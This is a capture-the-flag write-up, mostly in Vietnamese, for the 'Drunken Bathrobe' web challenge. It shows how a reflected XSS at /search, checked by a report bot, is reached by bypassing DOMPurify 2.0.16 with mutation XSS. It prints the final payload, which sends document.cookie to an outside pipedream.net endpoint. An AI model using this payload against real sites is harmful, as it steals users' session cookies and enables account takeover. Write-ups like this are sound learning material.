# **Hackappatoi CTF '22**
## **Drunken Bathrobe** 
___
### **Description:**

Welcome to the Drunken Bathrobe! Make yourself comfortable and order your favourite cocktail :)

Author: @voidPtr
```
http://hctf.hackappatoi.com:8002
```
___
### **Solution:**

Web có "/search" để ta kiểm tra số lượng của sản phẩm

![1.png](https://github.com/L4P1Nz/Hackappatoi-CTF-22/blob/main/Drunken%20Bathrobe/Media/1.png)

Và tại đây ta có Reflected XSS

![2.png](https://github.com/L4P1Nz/Hackappatoi-CTF-22/blob/main/Drunken%20Bathrobe/Media/2.png)

"/report" sẽ nhận query, và 1 con bot sẽ chạy để kiểm tra query đó tại /search

![3.png](https://github.com/L4P1Nz/Hackappatoi-CTF-22/blob/main/Drunken%20Bathrobe/Media/3.png)

![4.png](https://github.com/L4P1Nz/Hackappatoi-CTF-22/blob/main/Drunken%20Bathrobe/Media/4.png)

![5.png](https://github.com/L4P1Nz/Hackappatoi-CTF-22/blob/main/Drunken%20Bathrobe/Media/5.png)

Nhưng trước khi bot chạy để kiểm tra thì quey đã được lọc qua Dompurify và function secureQuery

![6.png](https://github.com/L4P1Nz/Hackappatoi-CTF-22/blob/main/Drunken%20Bathrobe/Media/6.png)

Check verion của Dompurify tại Dockerfile: 2.0.16

![7.png](https://github.com/L4P1Nz/Hackappatoi-CTF-22/blob/main/Drunken%20Bathrobe/Media/7.png)

Một bài explain vô cùng chi tiết [tại đây](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/).

### **Exploit:**

Chạy trên local thì mình thấy rằng payload cần phải được URL Encode 2 lần thì mới có tác dụng

![8.png](https://github.com/L4P1Nz/Hackappatoi-CTF-22/blob/main/Drunken%20Bathrobe/Media/8.png)

Vậy payload: 
```
<form><mamathth><mtext><form><mglyph><style></mamathth><img src=x onerror=fetch('https://eobdy9he407yt6p.m.pipedream.net/'+document.cookie)></style></mglyph></form></mtext></mamathth></form>
```

Final payload:

![9.png](https://github.com/L4P1Nz/Hackappatoi-CTF-22/blob/main/Drunken%20Bathrobe/Media/9.png)

Flag:

![10.png](https://github.com/L4P1Nz/Hackappatoi-CTF-22/blob/main/Drunken%20Bathrobe/Media/10.png)